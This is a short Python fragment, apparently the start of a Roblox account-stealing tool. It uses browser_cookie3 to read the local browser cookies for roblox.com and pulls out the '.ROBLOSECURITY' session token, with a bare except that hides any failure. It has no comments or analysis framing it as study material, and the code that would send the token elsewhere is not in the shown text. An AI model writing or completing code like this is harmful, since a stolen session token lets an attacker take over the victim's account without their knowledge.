import requests, robloxpy, json, browser_cookie3, os.path

user = os.path.expanduser("~")


def robloxl():
    data = [] 

    try:
        cookies = browser_cookie3.call(domain_name='roblox.com')    
        for cookie in cookies:
            print(cookie)
            if cookie.name == '.ROBLOSECURITY':
                data.append(cookies)
                data.append(cookie.value)
                return data
    except:
        pass
